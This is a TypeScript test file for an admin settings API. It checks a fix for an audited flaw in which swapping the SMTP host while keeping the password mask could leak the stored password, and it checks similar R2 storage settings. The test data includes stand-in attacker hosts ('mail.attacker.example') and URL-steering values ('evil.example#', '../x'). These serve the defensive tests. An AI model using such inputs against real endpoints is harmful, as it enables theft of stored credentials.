import assert from 'node:assert/strict'
import test, { mock } from 'node:test'

/**
 * Hai bước lấy mật khẩu SMTP đã lưu (lỗ hổng C1 của đợt rà soát 2026-10):
 *
 *   1. PUT /api/admin/settings `{ smtp_host: 'mail.attacker.example', smtp_pass: '********' }`
 *      — dấu che được hiểu là "giữ mật khẩu cũ", host mới vẫn được lưu;
 *   2. POST /api/admin/settings/test-email với dấu che — endpoint dùng cấu hình
 *      ĐÃ LƯU (host của kẻ tấn công + mật khẩu thật) và đăng nhập vào đó.
 *
 * Bước 2 tự nó đúng (chỉ dùng mật khẩu đã lưu với host đã lưu); lỗi nằm ở bước 1
 * cho phép ghép host mới với mật khẩu cũ. Ở đây chạy CẢ HAI handler thật trên
 * cùng một kho `settings` giả và một nodemailer giả ghi lại máy chủ mà nó đăng
 * nhập — khẳng định quan trọng: mật khẩu đã lưu không bao giờ tới một host khác.
 */

const SAVED_SECRET = 'SAVED-SMTP-SECRET'
const SAVED_R2_SECRET = 'SAVED-R2-SECRET'
const ACCOUNT_ID = '0123456789abcdef0123456789abcdef'

const store = new Map<string, string>()
function seed(entries: Record<string, string>) {
  store.clear()
  for (const [key, value] of Object.entries(entries)) store.set(key, value)
}
const SMTP_SAVED = {
  smtp_host: 'smtp.real.vn', smtp_port: '587', smtp_secure: 'false',
  smtp_user: 'portal@real.vn', smtp_pass: SAVED_SECRET, smtp_from: 'portal@real.vn',
}
const R2_SAVED = {
  media_provider: 'r2', r2_account_id: ACCOUNT_ID, r2_access_key: 'AKID', r2_secret_key: SAVED_R2_SECRET,
  r2_bucket: 'cdkt-media', r2_public_url: 'https://cdn.example.vn',
}

const logins: Array<{ host: string, port: number, user?: string, pass?: string }> = []
let sendBehaviour: (() => Promise<void>) | null = null

mock.module('nodemailer', {
  defaultExport: {
    createTransport: (options: { host: string, port: number, auth?: { user: string, pass: string } }) => {
      logins.push({ host: options.host, port: options.port, user: options.auth?.user, pass: options.auth?.pass })
      return { sendMail: async () => { if (sendBehaviour) await sendBehaviour() }, close: () => {} }
    },
  },
})

const rows = () => [...store].map(([key, value]) => ({ key, value }))
const tx = {
  insert: () => ({
    values: (value: { key?: string, value?: string }) => ({
      onDuplicateKeyUpdate: async () => { if (value.key !== undefined) store.set(value.key, value.value ?? '') },
      then: (resolve: (v: unknown) => unknown) => resolve(undefined), // activity_logs insert
    }),
  }),
  delete: () => ({ where: async () => {} }),
}
mock.module('../server/utils/db', {
  namedExports: {
    getDb: () => ({
      select: () => ({ from: async () => rows() }),
      transaction: async (fn: (t: typeof tx) => Promise<unknown>) => {
        // Rollback semantics: a throw inside the callback leaves the store as it was.
        const snapshot = new Map(store)
        try { return await fn(tx) } catch (error) { store.clear(); for (const [k, v] of snapshot) store.set(k, v); throw error }
      },
    }),
  },
})
mock.module('../server/utils/favicon-setting', { namedExports: { FAVICON_ICO_SETTING_KEY: 'favicon_ico_url', clearFaviconSettingCache: () => {} } })
mock.module('../server/utils/og-image-setting', { namedExports: { clearOgImageSettingCache: () => {} } })
mock.module('../server/utils/logger', { namedExports: { logWarn: () => {}, logInfo: () => {}, logError: () => {} } })

type Event = { body: unknown, context: Record<string, unknown> }
const globals = globalThis as unknown as Record<string, unknown>
globals.defineEventHandler = (handler: unknown) => handler
globals.readBody = async (event: Event) => event.body
globals.createError = (input: { statusCode: number, statusMessage: string }) => Object.assign(new Error(input.statusMessage), input)

type Handler = (event: Event) => Promise<{ ok: boolean, message?: string }>
const put = (await import('../server/api/admin/settings/index.put')).default as unknown as Handler
const testEmail = (await import('../server/api/admin/settings/test-email.post')).default as unknown as Handler
const { isCloudflareAccountId } = await import('../server/utils/settings-credential-guard')

// A delegated settings editor — the role the attack needs.
const EDITOR = { id: 9, isSuperAdmin: false, permissions: [{ resource: 'settings', canRead: true, canCreate: false, canUpdate: true, canDelete: false }] }
const SUPER = { id: 1, isSuperAdmin: true, permissions: [] }

const save = (settings: Record<string, unknown>, actor: unknown = EDITOR) => put({ body: { settings }, context: { adminUser: actor } })
const sendTest = (body: Record<string, unknown>) => testEmail({ body: { to: 'officer@real.vn', ...body }, context: { adminUser: EDITOR } })

async function rejection(promise: Promise<unknown>): Promise<{ statusCode: number, message: string }> {
  try { await promise } catch (error) { return error as { statusCode: number, message: string } }
  assert.fail('expected a rejection')
}

function reset(entries: Record<string, string> = SMTP_SAVED) {
  seed(entries)
  logins.length = 0
  sendBehaviour = null
}

// ─── SMTP: the two-step exfiltration ─────────────────────────────────────────

const RETARGETS: Array<[string, Record<string, unknown>]> = [
  ['host', { smtp_host: 'mail.attacker.example' }],
  ['host + port', { smtp_host: 'mail.attacker.example', smtp_port: '2525' }],
  ['port only', { smtp_port: '465' }],
  ['user only', { smtp_user: 'attacker@attacker.example' }],
  ['secure flag only', { smtp_secure: 'true' }],
  ['secure flag as a boolean', { smtp_secure: true }],
]
const UNTYPED_PASSWORDS: Array<[string, Record<string, unknown>]> = [
  ['the mask', { smtp_pass: '********' }],
  ['an empty field', { smtp_pass: '' }],
  ['no password field', {}],
  ['null', { smtp_pass: null }],
]

for (const [what, change] of RETARGETS) {
  for (const [label, pass] of UNTYPED_PASSWORDS) {
    test(`SMTP ${what} changed with ${label}: 400, nothing stored, and test-email still logs in to the SAVED host only`, async () => {
      reset()
      const error = await rejection(save({ ...change, ...pass }))
      assert.equal(error.statusCode, 400)
      assert.match(error.message, /nhập lại mật khẩu SMTP/)
      assert.deepEqual(Object.fromEntries(store), SMTP_SAVED, 'not a single key may be written')

      await sendTest({ smtp_host: 'mail.attacker.example', smtp_user: 'x', smtp_pass: '********' })
      assert.deepEqual(logins, [{ host: 'smtp.real.vn', port: 587, user: 'portal@real.vn', pass: SAVED_SECRET }])
    })
  }
}

test('key order does not matter: the password key arriving FIRST still does not unlock a new host', async () => {
  reset()
  const error = await rejection(save({ smtp_pass: '********', smtp_host: 'mail.attacker.example', smtp_port: '2525' }))
  assert.equal(error.statusCode, 400)
  assert.equal(store.get('smtp_host'), 'smtp.real.vn')
})

test('a new host WITH a typed password is saved; the stored secret is replaced and never sent anywhere afterwards', async () => {
  reset()
  await save({ smtp_host: 'smtp.new.vn', smtp_port: '465', smtp_secure: 'true', smtp_user: 'new@new.vn', smtp_pass: 'typed-new-password' })
  assert.equal(store.get('smtp_host'), 'smtp.new.vn')
  assert.equal(store.get('smtp_pass'), 'typed-new-password')
  await sendTest({ smtp_pass: '********' })
  assert.deepEqual(logins, [{ host: 'smtp.new.vn', port: 465, user: 'new@new.vn', pass: 'typed-new-password' }])
  assert.ok(!logins.some(login => login.pass === SAVED_SECRET))
})

test('the email page resubmitting its unchanged form (every smtp_* field + the mask) is a plain 200', async () => {
  reset()
  const result = await save({ ...SMTP_SAVED, smtp_pass: '********', smtp_secure: false })
  assert.deepEqual(result, { ok: true })
  assert.equal(store.get('smtp_pass'), SAVED_SECRET, 'the mask keeps the stored password')
})

test('spelling-only differences are not a new destination (host case, port padding, user whitespace)', async () => {
  reset()
  await save({ smtp_host: 'SMTP.Real.VN', smtp_port: ' 587 ', smtp_user: ' portal@real.vn ', smtp_pass: '********' })
  assert.equal(store.get('smtp_pass'), SAVED_SECRET)
})

test('with no password stored there is nothing to leak: the host may change without one', async () => {
  reset({ ...SMTP_SAVED, smtp_pass: '' })
  await save({ smtp_host: 'smtp.other.vn', smtp_pass: '' })
  assert.equal(store.get('smtp_host'), 'smtp.other.vn')
})

test('an unchanged sender address or other non-connection field never requires the password', async () => {
  reset()
  await save({ smtp_from: 'noreply@real.vn', smtp_pass: '********', site_name: 'Cổng' })
  assert.equal(store.get('smtp_from'), 'noreply@real.vn')
  assert.equal(store.get('smtp_pass'), SAVED_SECRET)
})

test('a port outside 25/465/587/2525 is refused on save (even with a typed password); a legacy stored port does not block other saves', async () => {
  reset()
  for (const port of ['6379', '3306', '22', '0', '65536', 'abc', '587x']) {
    const error = await rejection(save({ smtp_port: port, smtp_pass: 'typed' }))
    assert.equal(error.statusCode, 400, port)
    assert.match(error.message, /Cổng SMTP không được phép/, port)
  }
  assert.equal(store.get('smtp_port'), '587')
  for (const port of ['25', '465', '587', '2525', '']) {
    reset()
    await save({ smtp_port: port, smtp_pass: 'typed' })
    assert.equal(store.get('smtp_port'), port)
  }
  reset({ ...SMTP_SAVED, smtp_port: '3306' })
  await save({ ...SMTP_SAVED, smtp_port: '3306', smtp_pass: '********', smtp_from: 'x@real.vn' })
  assert.equal(store.get('smtp_from'), 'x@real.vn')
})

test('the superadmin is bound by the same rule — the boundary is the password, not the role', async () => {
  reset()
  const error = await rejection(save({ smtp_host: 'mail.attacker.example', smtp_pass: '********' }, SUPER))
  assert.equal(error.statusCode, 400)
})

// ─── R2 ──────────────────────────────────────────────────────────────────────

test('R2: a changed account id without the secret is refused; with the secret typed it is saved', async () => {
  reset(R2_SAVED)
  const other = 'fedcba9876543210fedcba9876543210'
  for (const secret of [{ r2_secret_key: '********' }, { r2_secret_key: '' }, {}]) {
    const error = await rejection(save({ r2_account_id: other, ...secret }))
    assert.equal(error.statusCode, 400)
    assert.match(error.message, /nhập lại Secret Access Key/)
    assert.equal(store.get('r2_account_id'), ACCOUNT_ID)
  }
  await save({ r2_account_id: other, r2_secret_key: 'typed-r2-secret' })
  assert.equal(store.get('r2_account_id'), other)
  assert.equal(store.get('r2_secret_key'), 'typed-r2-secret')
})

test('R2: an account id that would steer the endpoint host is refused even with a typed secret', async () => {
  reset(R2_SAVED)
  const steering = ['evil.example#', 'evil.example/', 'evil.example?', 'a@evil.example#', 'evil.example:443/', `${ACCOUNT_ID}.evil.example#`, `${ACCOUNT_ID}x`, '../x']
  // Proof that these values really steer the host createR2Client builds.
  for (const accountId of steering.slice(0, 5)) {
    assert.equal(new URL(`https://${accountId}.r2.cloudflarestorage.com`).hostname, 'evil.example', accountId)
  }
  for (const accountId of steering) {
    const error = await rejection(save({ r2_account_id: accountId, r2_secret_key: 'typed' }))
    assert.equal(error.statusCode, 400, accountId)
    assert.equal(store.get('r2_account_id'), ACCOUNT_ID)
  }
})

test('R2: every accepted account id pins the endpoint to a subdomain of r2.cloudflarestorage.com', async () => {
  const { createR2Client } = await import('../server/utils/media-r2')
  for (const accountId of [ACCOUNT_ID, 'FEDCBA9876543210FEDCBA9876543210']) {
    assert.ok(isCloudflareAccountId(accountId))
    // Bucket hợp lệ: `createR2Client` nay cũng kiểm bucket lúc dùng (3–63 ký tự).
    const client = createR2Client({ accountId, accessKeyId: 'a', secretAccessKey: 's', bucket: 'media-bucket', publicUrl: '' })
    const endpoint = await (client.config.endpoint as () => Promise<{ hostname: string }>)()
    assert.equal(endpoint.hostname.toLowerCase(), `${accountId.toLowerCase()}.r2.cloudflarestorage.com`)
    assert.equal(endpoint.hostname.split('.').length, 4, 'exactly one label in front of r2.cloudflarestorage.com')
  }
})

test('R2: bucket names outside the R2 naming rules are refused on change; resubmitting the stored form is fine', async () => {
  reset(R2_SAVED)
  for (const bucket of ['evil.example', 'a/b', 'UPPER', 'x', '-lead', 'trail-', 'a#b']) {
    const error = await rejection(save({ r2_bucket: bucket }))
    assert.equal(error.statusCode, 400, bucket)
  }
  await save({ ...R2_SAVED, r2_secret_key: '********' })
  assert.equal(store.get('r2_secret_key'), SAVED_R2_SECRET)
  await save({ r2_bucket: 'new-bucket-2026' })
  assert.equal(store.get('r2_bucket'), 'new-bucket-2026')
})
